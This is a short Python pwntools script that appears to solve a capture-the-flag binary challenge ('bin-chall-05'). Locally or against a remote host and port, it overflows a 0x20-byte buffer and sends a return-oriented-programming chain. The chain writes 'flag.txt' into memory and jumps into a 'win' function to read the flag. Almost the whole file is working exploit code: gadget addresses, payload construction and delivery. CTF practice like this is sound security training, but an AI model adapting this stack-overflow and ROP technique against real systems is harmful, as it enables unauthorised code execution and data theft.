#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./bin-chall-05")


def start(argv=[], *a, **kw):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

writable = elf.bss(0x100)
win = elf.symbols["win"] + 103
pop_rdi = 0x401413
pop_rsi_r15 = 0x401411
write_gadget = 0x40121e
pop_r12_r13_r14_r15 = 0x40140c
flag_txt = elf.bss(0x400)

pad = 0x20

payload = b"A" * pad
payload += flat(writable)  # rbp
payload += flat(pop_r12_r13_r14_r15, b"flag.txt", flag_txt, 0, 0)
payload += flat(write_gadget)
payload += flat(pop_rdi, flag_txt)
payload += flat(pop_rsi_r15, 0, 0)
payload += flat(win)

io.sendafter(b"Input: ", payload)

io.interactive()
